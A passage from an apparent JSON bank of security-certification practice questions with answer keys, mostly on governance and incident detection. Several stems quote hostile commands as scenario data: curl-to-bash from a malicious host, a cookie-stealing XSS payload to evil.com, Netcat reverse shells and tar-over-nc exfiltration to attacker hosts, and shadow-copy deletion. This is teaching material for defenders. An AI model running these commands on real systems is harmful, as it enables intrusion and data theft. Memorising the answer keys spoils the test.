        "Standardizing policies and ensuring each unit adheres to the same baseline requirements",
        "Shortening the patch cycle to weekly updates"
      ],
      "correctAnswerIndex": 2,
      "explanation": "Ensuring each business unit follows a consistent baseline set of policies addresses governance discrepancies, fostering uniform security control application.",
      "examTip": "Governance demands consistent application of policies across the organization. Deviations can create security and compliance gaps."
    },
    {
      "id": 48,
      "question": "A SIEM alert shows a successful login to a privileged user account from two geographically distant locations within a short time. No VPN usage was detected. What security control would MOST effectively prevent this type of attack?",
      "options": [
        "Multi-factor authentication (MFA) for privileged accounts",
        "Geo-blocking for logins from non-whitelisted regions",
        "Account lockout after multiple failed login attempts",
        "Privileged access management (PAM) solutions"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Impossible travel patterns with no VPN usage strongly indicate credential compromise. MFA would prevent unauthorized access even when credentials are known to attackers.",
      "examTip": "MFA is one of the most effective defenses against credential compromise attacks, especially for privileged accounts."
    },
    {
      "id": 49,
      "question": "Management is concerned that security investments are not yielding measurable results. Which of the following governance steps BEST addresses this concern?",
      "options": [
        "Mandating monthly phishing simulations for employees",
        "Developing KPIs and metrics tied to risk reduction and compliance outcomes",
        "Blocking access to social media sites for all user accounts",
        "Revising firewall configurations to track intrusion attempts"
      ],
      "correctAnswerIndex": 1,
      "explanation": "Governance requires measurable goals. Establishing KPIs and risk metrics helps demonstrate the effectiveness of security investments.",
      "examTip": "Governance ties investments to outcomes via metrics and KPI tracking, ensuring accountability for resource allocation."
    },
    {
      "id": 50,
      "question": "A malware sample analyzed in a sandbox displays the following behaviors:\n- Encrypts all user files\n- Deletes volume shadow copies\n- Demands Bitcoin payment for decryption\n\nWhich malware classification BEST matches these behaviors?",
      "options": [
        "Ransomware",
        "Trojan with C2 capabilities",
        "Rootkit hiding system processes",
        "Worm propagating via network shares"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Encrypting files, removing recovery options, and demanding cryptocurrency payments are classic ransomware behaviors.",
      "examTip": "Ransomware prevention strategies should include offline backups, endpoint protection, and user awareness training."
    },
    {
      "id": 51,
      "question": "A SOC analyst detects repeated outbound connections from an internal endpoint to multiple external IPs on port 443. The connections occur at precise intervals, with minimal data transfer.\n\nWhich attack technique does this MOST LIKELY indicate?",
      "options": [
        "Beaconing behavior associated with command-and-control (C2) channels",
        "Exfiltration of sensitive data using HTTPS tunnels",
        "Domain Generation Algorithm (DGA) malware activity",
        "Credential harvesting via man-in-the-middle (MITM) attack"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Consistent outbound connections with minimal data transfer at regular intervals indicate beaconing, where malware communicates with a C2 server.",
      "examTip": "Look for repetitive, low-data outbound connections—this is a key indicator of C2 beaconing."
    },
    {
      "id": 52,
      "question": "Which of the following BEST illustrates a risk mitigation strategy at the governance level for safeguarding intellectual property?",
      "options": [
        "Updating the acceptable use policy to prohibit personal email on corporate devices",
        "Requiring all critical systems to use biometrics for multi-factor authentication",
        "Establishing a corporate policy that mandates encryption and controlled access for sensitive research data",
        "Increasing the perimeter firewall rules to include new threat intelligence feeds"
      ],
      "correctAnswerIndex": 2,
      "explanation": "A formal policy requiring encryption and controlled access demonstrates a governance-level approach, setting mandatory guidelines to protect intellectual property.",
      "examTip": "At the governance tier, broad policy directives set the stage for operational security measures."
    },
    {
      "id": 53,
      "question": "A forensic analyst reviews PowerShell logs and finds the following suspicious command:\n\n`powershell.exe -NoP -W Hidden -Enc UABvAHcAZQByAHMAaABlAGwAbA==`\n\nWhich security control would BEST help detect or mitigate this attack?",
      "options": [
        "Enable PowerShell script block logging",
        "Block outbound PowerShell execution using host-based controls",
        "Monitor for excessive PowerShell execution using SIEM",
        "Restrict execution of all PowerShell scripts via Group Policy"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Script block logging records the full content of PowerShell commands, making it easier to detect obfuscated and encoded execution attempts.",
      "examTip": "Enable script block logging to capture and analyze suspicious PowerShell activities."
    },
    {
      "id": 54,
      "question": "A SIEM generates alerts for multiple login attempts using different usernames from a single external IP address. The attempts are spread over several hours and do not trigger account lockouts.\n\nWhich attack technique is MOST LIKELY occurring?",
      "options": [
        "Password spraying attack",
        "Credential stuffing attack",
        "Brute force attack",
        "Session hijacking attempt"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Password spraying uses a few common passwords across many accounts over a long period to avoid triggering account lockouts.",
      "examTip": "Password spraying indicators: multiple accounts, slow attempts, and a single source IP."
    },
    {
      "id": 55,
      "question": "An incident response team discovers that an attacker gained access to a cloud-based database and executed the following SQL query:\n\n`SELECT * FROM users WHERE username = 'admin' OR '1'='1';`\n\nWhich security vulnerability was exploited?",
      "options": [
        "SQL injection",
        "Broken authentication",
        "Insecure direct object reference (IDOR)",
        "Cross-site scripting (XSS)"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `OR '1'='1'` clause is a classic SQL injection technique that bypasses authentication by modifying the SQL query logic.",
      "examTip": "Use prepared statements and parameterized queries to prevent SQL injection."
    },
    {
      "id": 56,
      "question": "An attacker exploits an API that allows excessive data retrieval by iterating through sequential user IDs (`/api/user?id=1, /api/user?id=2`).\n\nWhich security vulnerability does this BEST describe?",
      "options": [
        "Insecure Direct Object Reference (IDOR)",
        "Broken access control",
        "Excessive data exposure",
        "Business logic flaw"
      ],
      "correctAnswerIndex": 0,
      "explanation": "IDOR allows attackers to access unauthorized resources by directly manipulating object references in API calls.",
      "examTip": "Enforce proper authorization checks for API endpoints to prevent IDOR exploits."
    },
    {
      "id": 57,
      "question": "A security analyst finds a process running on a compromised host with the following command:\n\n`nc -lvp 5555 -e /bin/bash`\n\nWhat is the attacker's PRIMARY objective with this command?",
      "options": [
        "Establish a backdoor for remote command execution",
        "Conduct port scanning on the internal network",
        "Transfer data to an external server via Netcat",
        "Exploit a vulnerable service using reverse shell techniques"
      ],
      "correctAnswerIndex": 0,
      "explanation": "This Netcat command creates a listener on port 5555, executing `/bin/bash` when connected to, providing remote shell access.",
      "examTip": "Monitor network activity for unexpected Netcat listeners—commonly used in unauthorized remote access."
    },
    {
      "id": 58,
      "question": "A forensic analysis of a ransomware attack reveals that the malware deleted volume shadow copies before encrypting files.\n\nWhich command was MOST LIKELY executed to accomplish this?",
      "options": [
        "`vssadmin delete shadows /all /quiet`",
        "`cipher /w:C:\\Users`",
        "`rm -rf / --no-preserve-root`",
        "`wevtutil cl System`"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `vssadmin delete shadows /all /quiet` command removes shadow copies, preventing file restoration after ransomware encryption.",
      "examTip": "Monitor system logs for shadow copy deletion commands—common in ransomware attacks."
    },
    {
      "id": 59,
      "question": "An attacker exploits a directory traversal vulnerability and retrieves `/etc/passwd` from a Linux web server.\n\nWhich security control would BEST mitigate this attack?",
      "options": [
        "Implement server-side input validation and path sanitization",
        "Enforce HTTPS for all web traffic",
        "Encrypt sensitive files on the file system",
        "Disable directory listing on the web server"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Validating and sanitizing file path inputs prevent directory traversal attacks from accessing unauthorized files.",
      "examTip": "Restrict user-supplied input when referencing file paths—never trust direct input from the client."
    },
    {
      "id": 60,
      "question": "A security team identifies unusual outbound DNS requests containing large amounts of encoded data but no corresponding web traffic.\n\nWhat is the MOST LIKELY explanation for this behavior?",
      "options": [
        "DNS tunneling for covert data exfiltration",
        "Domain Generation Algorithm (DGA) malware activity",
        "DNS amplification attack against external servers",
        "Man-in-the-middle (MITM) attack using rogue DNS"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Encoded payloads in DNS queries with no matching HTTP/S traffic strongly suggest DNS tunneling for covert exfiltration or command-and-control (C2).",
      "examTip": "Monitor DNS logs for abnormally large queries—common indicators of DNS tunneling activity."
    },
    {
      "id": 61,
      "question": "A security analyst discovers the following command executed on a compromised Linux system:\n\n`curl -s http://malicious-site.com/payload.sh | bash`\n\nWhat is the attacker's PRIMARY objective with this command?",
      "options": [
        "Download and execute a malicious script in memory",
        "Establish persistence using cron jobs",
        "Exfiltrate system logs to an external server",
        "Escalate privileges by modifying kernel parameters"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The command downloads a remote script and executes it immediately in memory using `bash`, avoiding disk-based detection.",
      "examTip": "Monitor network logs for suspicious curl or wget activity combined with direct execution."
    },
    {
      "id": 62,
      "question": "An attacker exploits a misconfigured AWS IAM policy to escalate privileges. The attack involves assuming an IAM role that grants administrator access.\n\nWhich security measure would have MOST effectively prevented this?",
      "options": [
        "Enforce least-privilege IAM role policies",
        "Enable multi-factor authentication (MFA) for all IAM users",
        "Restrict API access to internal IP ranges",
        "Monitor IAM actions using AWS CloudTrail"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Overly permissive IAM policies can allow privilege escalation. Enforcing least-privilege principles minimizes this risk.",
      "examTip": "Regularly audit IAM policies to ensure they grant only the minimum permissions required."
    },
    {
      "id": 63,
      "question": "A penetration tester successfully injects the following payload into a web application:\n\n`<script>document.location='http://evil.com/cookie?'+document.cookie</script>`\n\nWhich attack technique was used?",
      "options": [
        "Cross-site scripting (XSS)",
        "Cross-site request forgery (CSRF)",
        "SQL injection",
        "Server-side request forgery (SSRF)"
      ],
      "correctAnswerIndex": 0,
      "explanation": "This script captures a user's session cookies and sends them to a malicious server, a typical example of cross-site scripting (XSS).",
      "examTip": "Sanitize and encode user input to prevent XSS attacks."
    },
    {
      "id": 64,
      "question": "An attacker uses the following command after compromising a Linux host:\n\n`echo 'nc -e /bin/bash attacker-ip 4444' | at now + 5 minutes`\n\nWhat is the PRIMARY purpose of this command?",
      "options": [
        "Schedule execution of a reverse shell",
        "Modify system logs to evade detection",
        "Enumerate running processes on the system",
        "Escalate privileges using a delayed payload"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The command schedules a Netcat reverse shell to execute in 5 minutes, potentially bypassing immediate detection.",
      "examTip": "Monitor job scheduling commands (`at`, `cron`, `schtasks`)—common persistence techniques used by attackers."
    },
    {
      "id": 65,
      "question": "A forensic investigation reveals that an attacker successfully exploited a server via the following HTTP request:\n\n`GET /download.php?file=../../../../etc/passwd`\n\nWhich security vulnerability does this BEST represent?",
      "options": [
        "Directory traversal",
        "Local file inclusion (LFI)",
        "Remote file inclusion (RFI)",
        "Command injection"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `../../../../etc/passwd` path manipulation is characteristic of directory traversal attacks, allowing access to restricted system files.",
      "examTip": "Sanitize file path inputs and implement allowlists to prevent directory traversal exploits."
    },
    {
      "id": 66,
      "question": "A malware sample is observed creating scheduled tasks on Windows endpoints with the following command:\n\n`schtasks /create /tn \"Updater\" /tr \"C:\\Users\\Public\\malware.exe\" /sc minute /mo 10`\n\nWhat is the attacker's PRIMARY objective with this command?",
      "options": [
        "Establish persistence by executing malware every 10 minutes",
        "Delete forensic evidence by overwriting logs",
        "Exfiltrate sensitive files via scheduled jobs",
        "Escalate privileges by running scheduled tasks as SYSTEM"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The command schedules malware execution every 10 minutes, ensuring persistence across reboots and user logins.",
      "examTip": "Monitor scheduled tasks for unauthorized entries—persistence techniques often involve task scheduling."
    },
    {
      "id": 67,
      "question": "A network administrator detects multiple outbound connections from an internal host to an external IP on port 22. Further investigation reveals:\n- The connections originate from a recently deployed server\n- The connections occur outside normal business hours\n- The server was configured with weak SSH credentials\n\nWhat is the MOST LIKELY explanation for this activity?",
      "options": [
        "Compromised SSH credentials used for data exfiltration",
        "Routine administrative SSH access by IT staff",
        "An automated vulnerability scanner testing SSH configurations",
        "Malware using SSH for command-and-control (C2) traffic"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Unusual outbound SSH connections, especially outside normal hours, strongly suggest compromised credentials used for data exfiltration.",
      "examTip": "Monitor outbound SSH traffic and enforce key-based authentication to prevent credential-based attacks."
    },
    {
      "id": 68,
      "question": "A penetration tester runs the following command on a compromised Linux host:\n\n`tar cf - /home/user | nc attacker-ip 5555`\n\nWhat is the attacker’s PRIMARY goal?",
      "options": [
        "Exfiltrate files to a remote host using Netcat",
        "Create a backup of the target user’s home directory",
        "Compress and encrypt files before execution",
        "Modify file timestamps to evade forensic analysis"
      ],
      "correctAnswerIndex": 0,
      "explanation": "This command archives `/home/user` and sends it over Netcat, a technique commonly used for data exfiltration.",
      "examTip": "Unusual Netcat connections combined with data compression utilities should be investigated as potential exfiltration attempts."
    },
    {
      "id": 69,
      "question": "A security team detects a process executing with the following command:\n\n`powershell.exe -NoP -W Hidden -Enc JAB4AG0AbABfAGMAbwBuAHQAZQBuAHQAPQAiAGgAdAB0AHAAOgAvAC8AdwB3AHcALgBzAHUAcwBwAGkAYwBpAG8AdQBzAC4AYwBvAG0ALwBtAGEAbAB3AGEAcgBlAC4AcABzADEAIgA7AFgARQBYACAASQBFWAAgACQAeABtAGwAXwBjAG8AbgB0AGUAbgB0AA==`\n\nWhich security technique would BEST help detect or prevent this attack?",
      "options": [
        "Enable PowerShell script block logging",
        "Block execution of PowerShell scripts at the host level",
        "Restrict outbound internet access for all endpoints",
        "Apply network segmentation to limit lateral movement"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Script block logging captures full PowerShell command execution, allowing detection of obfuscated and encoded attack payloads.",
      "examTip": "Look for PowerShell commands using `-Enc` and base64 encoding—these often indicate obfuscated attack techniques."
    },
    {
      "id": 70,
      "question": "A security analyst detects repeated outbound DNS queries containing large encoded payloads from an internal server. No corresponding web traffic is observed.\n\nWhat is the MOST LIKELY explanation for this behavior?",
      "options": [
        "DNS tunneling for data exfiltration",
        "Domain Generation Algorithm (DGA) malware activity",
        "DNS poisoning to redirect traffic",
        "Malware using DNS for privilege escalation"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Encoded DNS queries without matching web traffic strongly suggest DNS tunneling, a method for covert exfiltration or command-and-control communication.",
      "examTip": "Monitor DNS traffic for abnormally large queries—these are common indicators of DNS tunneling."
    },
    {
      "id": 71,
      "question": "A SOC analyst observes multiple login attempts on a web application using the following pattern:\n- Attempts originate from a single IP address\n- Common passwords are tried against multiple user accounts\n- Attempts are spaced out to avoid detection\n\nWhich attack technique is being utilized?",
      "options": [
        "Password spraying attack",
        "Credential stuffing attack",
        "Brute force attack",
        "Session hijacking attack"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Password spraying involves attempting commonly used passwords against multiple accounts slowly to evade account lockout mechanisms.",
      "examTip": "Monitor for login attempts with common passwords across multiple accounts—classic indicators of password spraying."
    },
    {
      "id": 72,
      "question": "A forensic analysis reveals the following:\n- A Netcat listener running on port 8080\n- The listener executes `/bin/bash` upon connection\n\nWhich security risk does this pose?",
      "options": [
        "Remote command execution via reverse shell",
        "Data exfiltration via an open TCP port",
        "Privilege escalation through shell manipulation",
        "Lateral movement across internal network segments"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Netcat listeners configured to execute `/bin/bash` provide remote attackers with shell access, enabling remote command execution (reverse shell).",
      "examTip": "Monitor high-numbered port listeners—especially when associated with shell executions—as they often indicate reverse shell activity."
    },
    {
      "id": 73,
      "question": "An attacker uses the following command after gaining shell access to a Linux host:\n\n`tar czf - /var/log | nc attacker-ip 4444`\n\nWhat is the MOST LIKELY objective of this command?",
      "options": [
        "Exfiltrate log files to cover tracks and evade detection",
        "Compress logs for archiving before wiping them",
        "Search log files for sensitive credentials",
        "Set up continuous log forwarding for future analysis"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Archiving and sending logs via Netcat suggests the attacker is exfiltrating logs to analyze them offline or remove them from the target to hinder forensic investigations.",
      "examTip": "Unusual Netcat activity involving system logs typically indicates data exfiltration or anti-forensic activities."
    },
    {
      "id": 74,
      "question": "A web application scan reveals the following HTTP response:\n\n`HTTP/1.1 500 Internal Server Error`\n\nFollowed by a stack trace showing:\n\n`java.lang.RuntimeException: Unexpected input received` \n\nWhat security misconfiguration does this MOST LIKELY indicate?",
      "options": [
        "Verbose error messages revealing sensitive application information",
        "Cross-site scripting (XSS) vulnerability in error handling routines",
        "Improper input sanitization leading to SQL injection",
        "Lack of secure coding practices allowing buffer overflow exploits"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Detailed stack traces can reveal underlying technologies and application logic, providing attackers with valuable reconnaissance data.",
      "examTip": "Ensure applications are configured to suppress detailed error messages in production environments."
    },
    {
      "id": 75,
      "question": "An organization is implementing an integrated GRC tool. Which of the following is the MAIN advantage from a governance perspective?",
      "options": [
        "Continuous software patching without manual intervention",
        "Automatic encryption of all data at rest and in transit",
        "Single repository for policy documentation, risk registers, and compliance dashboards",
        "Real-time network traffic analysis for all inbound and outbound connections"
      ],
      "correctAnswerIndex": 2,
      "explanation": "An integrated GRC platform centralizes governance artifacts (policies, risk registers, compliance dashboards), providing a unified view for decision-makers.",
      "examTip": "Consolidation of governance, risk, and compliance information is a key benefit of GRC solutions, improving oversight and accountability."
    },
    {
      "id": 76,
      "question": "Which of the following BEST helps an organization maintain governance over third-party relationships?",
      "options": [
        "Configuring boundary firewalls to block malicious traffic",
        "Conducting frequent red team exercises on supplier networks",
        "Requiring third-party audits and service-level agreements reflecting compliance",
        "Mandating multi-factor authentication for all remote logins"
      ],
      "correctAnswerIndex": 2,
      "explanation": "Third-party governance typically involves formal agreements (SLAs, contracts) and audits to ensure compliance and security standards are consistently upheld.",
      "examTip": "Vendor risk management is part of governance. Formalized contracts, SLAs, and compliance clauses are critical tools."
    },
    {
      "id": 77,
      "question": "A SOC analyst identifies multiple successful SSH logins from various foreign IP addresses using the same privileged account. The logins occurred within minutes of each other, with no corresponding VPN usage.\n\nWhat is the MOST LIKELY cause of this activity?",
      "options": [
        "Credential compromise through password reuse",
        "Brute force attack successfully guessing SSH credentials",
        "SSH tunneling used for secure remote access",
        "Insider threat accessing systems from remote locations"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Multiple logins from geographically distant IPs without VPN use strongly indicate credential compromise, potentially from reused passwords exposed in previous breaches.",
      "examTip": "Implement multi-factor authentication (MFA) and monitor for impossible travel patterns to detect credential compromise."
    },
    {
      "id": 78,
      "question": "A cloud security audit discovers that API keys with administrative privileges were hard-coded in a public GitHub repository.\n\nWhat is the MOST appropriate immediate action?",
      "options": [
        "Revoke the exposed API keys and rotate them immediately",
        "Configure role-based access control (RBAC) for API access",
        "Restrict public access to the GitHub repository",
        "Enable API access logging and monitor for suspicious usage"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Hard-coded API keys in public repositories represent a critical security risk. The immediate response is to revoke and rotate the exposed keys to prevent unauthorized access.",
      "examTip": "Never hard-code credentials; use secrets management tools to secure API keys."
    },
    {
      "id": 79,
      "question": "A malware sample analyzed in a sandbox displays the following behaviors:\n- Establishes outbound connections on port 4444\n- Executes PowerShell commands in memory\n- Deletes scheduled Windows Defender scans\n\nWhich malware classification BEST matches these behaviors?",
      "options": [
        "Trojan enabling persistent remote access",
        "Rootkit hiding malicious processes at the kernel level",
        "Worm self-propagating across network shares",
        "Ransomware encrypting user files for ransom payments"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Persistent remote access, in-memory PowerShell execution, and disabling defenses are characteristic behaviors of a Trojan designed for long-term access.",
      "examTip": "Monitor PowerShell activity and port 4444 communications—common indicators of Trojan behavior."
    },
    {
      "id": 80,
      "question": "A newly passed law requires specific breach notification timelines. Which of the following governance documents is MOST likely to address these legal obligations?",
      "options": [
        "Network segmentation configuration standards",
        "Incident communication and escalation policy",
        "Acceptable use policy for mobile devices",
        "User access review procedures"
      ],
      "correctAnswerIndex": 1,
      "explanation": "An incident communication and escalation policy defines roles, responsibilities, and timelines for notifying stakeholders, aligning with breach notification laws.",
      "examTip": "Ensure your incident response governance covers legal reporting requirements to avoid potential penalties."
    },
    {
      "id": 81,
      "question": "A SOC analyst reviews SIEM alerts indicating the following sequence of events:\n- Successful login from an unusual geographic location\n- Creation of new user accounts with administrator privileges\n- Outbound connections to an external IP on port 8080\n\nWhat MITRE ATT&CK tactic is MOST LIKELY represented in this scenario?",
      "options": [
        "Persistence",
        "Initial Access",
        "Privilege Escalation",
        "Lateral Movement"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The creation of admin accounts suggests persistence, ensuring continued access.",
      "examTip": "Look for admin account creation and outbound C2 communications—key signs of persistence and command and control stages."
    },
    {
      "id": 82,
      "question": "A penetration tester discovers a web application that reflects user input in its responses. By injecting the following payload, the tester executes arbitrary JavaScript in another user’s browser:\n\n`<script>alert('XSS')</script>`\n\nWhich type of vulnerability is this?",
      "options": [
        "Reflected cross-site scripting (XSS)",
        "Stored cross-site scripting (XSS)",
        "DOM-based cross-site scripting (XSS)",
        "Server-side request forgery (SSRF)"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The payload is reflected immediately in the HTTP response, indicating reflected XSS, which executes code when the victim clicks a malicious link.",
      "examTip": "Reflected XSS is commonly exploited via malicious links—use input sanitization and output encoding to prevent it."
    },
    {
      "id": 83,
      "question": "A forensic analyst discovers this Netcat command in logs:\n\n`nc -nv attacker-ip 4444 -e /bin/bash`\n\nWhat is the attacker's PRIMARY objective with this command?",
      "options": [
        "Establish a reverse shell for remote command execution",
        "Conduct port scanning on the internal network",
        "Exfiltrate files from the victim’s machine",
        "Create a persistent connection using SSH tunneling"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Netcat commands with `-e /bin/bash` are designed to establish reverse shells, giving attackers remote command-line access to the compromised host.",
      "examTip": "Reverse shells typically use high-numbered ports (e.g., 4444)—monitor for unusual outbound connections on these ports."
    },
    {
      "id": 84,
      "question": "The board wants evidence that critical data is protected throughout its lifecycle. From a governance perspective, which of the following BEST addresses this requirement?",
      "options": [
        "Performing vulnerability scans against the database daily",
        "Implementing a key management policy that covers data creation through secure disposal",
        "Deploying next-generation firewalls at each network boundary",
        "Using honeypots to detect unauthorized access attempts"
      ],
      "correctAnswerIndex": 1,
      "explanation": "A key management policy that defines how data is encrypted, stored, accessed, and destroyed ensures the governance-level requirement for end-to-end data protection.",
      "examTip": "Data lifecycle governance extends beyond technical controls, requiring documented policies for creation, storage, and disposal."
    },
    {
      "id": 85,
      "question": "An attacker exploits a directory traversal vulnerability by submitting the following HTTP request:\n\n`GET /app.php?file=../../../../etc/shadow`\n\nWhich security control would BEST mitigate this vulnerability?",
      "options": [
        "Server-side input validation and file path sanitization",
        "Deploying a web application firewall (WAF)",
        "Encrypting sensitive system files",
        "Restricting file permissions on the web server"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Directory traversal exploits are mitigated by sanitizing and validating file path inputs to prevent unauthorized file access.",
      "examTip": "Validate all user inputs referencing file paths—never allow relative path traversal from untrusted sources."
    },
    {
      "id": 86,
      "question": "A cloud security engineer discovers that several compute instances were provisioned without authorization, leading to a spike in billing costs. Resource usage shows high GPU consumption.\n\nWhat is the MOST LIKELY objective of the attacker?",
      "options": [
        "Cryptocurrency mining (cryptojacking)",
        "Distributed denial-of-service (DDoS) staging",
        "Lateral movement in cloud infrastructure",
        "Persistent access for future exploitation"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Sudden GPU workload spikes and high billing costs are classic indicators of cryptojacking, where attackers use compromised cloud resources for cryptocurrency mining.",
      "examTip": "Set up billing alerts and monitor resource utilization in cloud environments to detect cryptojacking."
    },
    {
      "id": 87,
      "question": "An attacker uses the following PowerShell command on a Windows endpoint:\n\n`powershell.exe -nop -w hidden -enc UABvAHcAZQByAHMAaABlAGwAbA==`\n\nWhat security measure would BEST help detect this malicious activity?",
      "options": [
        "Enable PowerShell script block logging",
        "Restrict PowerShell execution to signed scripts only",
        "Implement host-based firewalls to block PowerShell traffic",
        "Apply file integrity monitoring (FIM) to detect changes"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Script block logging captures the content of all PowerShell executions, making it easier to detect obfuscated or encoded malicious commands.",
      "examTip": "Enable detailed logging for scripting languages like PowerShell—obfuscation flags like `-enc` are key indicators of malicious use."
    },
    {
      "id": 88,
      "question": "A cloud audit identifies that an S3 bucket hosting web content allows public read and write access. Malicious JavaScript files are found uploaded to the bucket.\n\nWhat risk does this misconfiguration introduce?",
      "options": [
        "Malware distribution to users accessing the bucket’s content",
        "Credential theft via public access to configuration files",
        "Data exfiltration through unauthorized file downloads",
        "Privilege escalation through cloud metadata exposure"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Public write permissions allow attackers to upload malicious content, potentially leading to drive-by malware downloads when users access the bucket's web-hosted content.",
      "examTip": "Review and restrict S3 bucket permissions—public write access should be avoided unless absolutely necessary."
    },
    {
      "id": 89,
      "question": "Which of the following scenarios is an example of governance failure in a risk management program?",
      "options": [
        "Failing to document acceptance of a critical known vulnerability at the executive level",
        "Adding new intrusion prevention signatures one week late",
        "Conducting quarterly vulnerability scans instead of monthly scans",
        "Ignoring a single false-positive malware alert in a pilot environment"
      ],
      "correctAnswerIndex": 0,
      "explanation": "A governance failure occurs when leadership-level decisions, like risk acceptance, are not formally documented or authorized, undermining accountability.",
      "examTip": "Ensure that all high-level risk decisions are documented, signed off, and traceable to governance structures."
    },
    {
      "id": 90,
      "question": "A penetration tester discovers that a web application's session tokens are predictable. The tester successfully hijacks a user session by guessing the token.\n\nWhat vulnerability does this MOST LIKELY represent?",
      "options": [
        "Broken authentication due to weak session management",
        "Cross-site request forgery (CSRF) using predictable tokens",
        "IDOR (Insecure Direct Object Reference) vulnerability",
        "Reflected cross-site scripting (XSS) via session token exposure"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Predictable session tokens enable attackers to hijack sessions by guessing valid tokens, reflecting broken authentication and weak session management practices.",
      "examTip": "Session tokens should be long, random, and securely generated to prevent hijacking attempts."
    },
    {
      "id": 91,
      "question": "A security analyst observes multiple internal hosts making outbound connections to an external IP over port 4444. The following Netcat command was identified on one host:\n\n`nc -nv 203.0.113.45 4444 -e /bin/bash`\n\nWhat is the MOST immediate action to contain the threat?",
      "options": [
        "Block outbound connections to port 4444 at the network firewall",
        "Disable Netcat binaries on all internal endpoints",
        "Conduct memory forensics on compromised endpoints",
        "Isolate affected hosts from the network"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Blocking outbound traffic on port 4444 cuts off the attacker's command-and-control channel immediately, preventing further exploitation.",
      "examTip": "Reverse shell communications often use ports like 4444—restrict these at network perimeters as a preventive measure."
    },
    {
      "id": 92,
      "question": "Which of the following BEST represents a governance-oriented control for maintaining continuous compliance in an ever-changing threat landscape?",
      "options": [
        "Establishing a policy mandating periodic re-assessment of controls and gap analyses",
        "Deploying machine-learning threat detection tools across the DMZ",
        "Requiring the use of security tokens for all administrative logins",
        "Scheduling weekly system patches for all critical servers"
      ],
      "correctAnswerIndex": 0,
      "explanation": "A policy requiring periodic re-assessment of controls ensures that governance structures adapt to evolving threats and compliance requirements.",
      "examTip": "Continuous compliance is underpinned by governance policies that enforce regular evaluations and updates of security controls."
    }
    {
      "id": 93,
      "question": "A penetration tester discovers the following encoded PowerShell command in process logs:\n\n`powershell.exe -NoP -W Hidden -Enc SQBtAG0AbwByAHQAIABkAGEAdABh`\n\nWhat security measure would MOST effectively detect such obfuscated PowerShell activity?",
      "options": [
        "Enable PowerShell script block logging",
        "Implement application whitelisting policies",
        "Block all outbound PowerShell execution",
        "Monitor for suspicious process spawning in SIEM"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Script block logging captures the full content of executed scripts, making obfuscated PowerShell activity visible to defenders.",
      "examTip": "Look for PowerShell executions using `-Enc` flags—these often indicate malicious obfuscation attempts."
    },
    {
      "id": 94,
      "question": "After a major privacy incident, regulators request proof that the organization provided sufficient training on data handling. Which of the following governance artifacts is MOST useful to demonstrate compliance?",
      "options": [
        "Change management logs showing prior system modifications",
        "SIEM dashboards containing user login history",
        "Security awareness training records with employee completion certificates",
        "Network diagrams illustrating data flow"
      ],
      "correctAnswerIndex": 2,
      "explanation": "Training records and completion certificates show evidence of formal training, aligning with governance requirements for demonstrating compliance.",
      "examTip": "Maintain verifiable records of all mandatory trainings to satisfy regulatory inquiries, especially regarding privacy and data handling."
    },
    {
      "id": 95,
      "question": "A new CFO wants to integrate security governance into enterprise risk management processes. Which of the following is the BEST first step?",
      "options": [
        "Purchase additional cyber insurance coverage for likely events",
        "Redefine the company’s risk appetite and establish it in governance policies",
        "Enhance firewall performance to reduce external attack vectors",
        "Schedule monthly red team engagements"
      ],
      "correctAnswerIndex": 1,
      "explanation": "Establishing or redefining the risk appetite at the governance level ensures security considerations are integrated into broader enterprise risk decisions.",
      "examTip": "Risk appetite is a foundational governance element, guiding how the organization manages and prioritizes various risks."
    },
    {
      "id": 96,
      "question": "A cloud security engineer identifies that administrative API keys were hard-coded in a public GitHub repository. What should be the FIRST step to mitigate this risk?",
      "options": [
        "Revoke exposed API keys and rotate them immediately",
        "Enable multi-factor authentication (MFA) for API access",
        "Restrict public access to the GitHub repository",
        "Implement role-based access controls (RBAC) for cloud resources"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Exposed API keys should be revoked and rotated immediately to prevent unauthorized access. Additional measures like MFA and RBAC follow afterward.",
      "examTip": "Never hard-code credentials; use secure secrets management solutions to store sensitive keys."
    },
    {
      "id": 97,
      "question": "An attacker exploits an insecure deserialization vulnerability on a web server, resulting in remote code execution. What is the BEST mitigation strategy?",
      "options": [
        "Validate and sanitize all serialized data before deserialization",
        "Encrypt serialized data during transmission and storage",
        "Restrict user input length and encoding formats",
        "Apply secure transport protocols such as TLS for all communications"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Proper validation and sanitization of serialized data prevent attackers from injecting malicious objects that could lead to remote code execution.",
      "examTip": "Never deserialize untrusted data without proper validation—prefer secure serialization formats like JSON."
    },
    {
      "id": 98,
      "question": "A threat hunter observes that an attacker is leveraging SSH tunneling to bypass network controls and access internal systems. Which detection technique would MOST effectively identify this behavior?",
      "options": [
        "Monitor for unusual SSH connections with high port usage",
